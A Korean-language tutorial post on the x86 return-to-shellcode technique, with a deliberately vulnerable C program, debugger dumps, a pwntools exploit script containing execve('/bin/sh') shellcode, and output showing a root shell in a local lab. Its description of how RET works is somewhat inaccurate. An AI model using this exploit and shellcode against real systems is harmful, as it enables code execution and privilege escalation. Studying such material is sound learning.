---
title: Return-to-shellcode - x86
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-shellcode]
math: true
mermaid: true
---


## Description

return address 영역에 Shellcode가 저장된 주소로 변조해, shellcode 호출하는 기법이다.

### CALL

return address를 stack에 저장하고, 피연산자 주소로 이동한다.

### RET

EBP 레지스터가 가리키는 stack 영역의 값을 RIP 레지스터에 저장 후 JMP 명령을 통해 RIP에 저장된 영역으로 이동한다.

```
; CALL
push return_address
jmp

; RET
pop eip
jmp eip
```

## Proof of concept

```c
// Vuln Code
// gcc -z execstack -fno-stack-protector -o test test.c
#include <stdio.h>
#include <unistd.h>

void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 100);
}

void main(){
    vuln();
}
```

“A”62 + “B”4 입력 시 return address 변조가 가능하다.

```
gdb-peda$ x/24wx $ebp
0xbfe98a78: 0x41414141  0x42424242  0xb7f233dc  0xbfe98aa0
```

변조된 메모리 구조

```
gdb-peda$ x/24wx $ebp
0xbfa06f08: 0x41414141  0x42424242  0xb7eda30a  0xbfa06f30
0xbfa06f18: 0x00000000  0xb7d40637  0xb7eda000  0xb7eda000
```

ASLR 적용되어 있어 stack 주소가 랜덤하지만 지역변수 buf의 주소가 출력되므로 buf에 shellcode 삽입하고 return address에 buf 주소 삽입하여 shellcode 실행할 수 있다.

## Exploit code

```python
# Exploit Code
from pwn import *

p = process('./test')
recv = p.recvline()
buf = int(recv.split(' ')[3].split('\n')[0],16)
print('buf: '+hex(buf))

p.sendline('\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80'+'A'*31+ p32(buf))
p.interactive()
```

## Exploit

```bash
bs@bs-virtual-machine:~/vulns/RTS$ python exploit.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './test': pid 16624
buf: 0xbfe9be8e
[*] Switching to interactive mode
1󿾱ٱəxb0xa4̀jx0bXQh//shh/binx89㊑̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAx8exbe
$                                                                             id
uid=0(root) gid=1000(bs) groups=1000(bs),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

## Refereces
- [02.Return to Shellcode](https://www.lazenca.net/display/TEC/02.Return+to+Shellcode)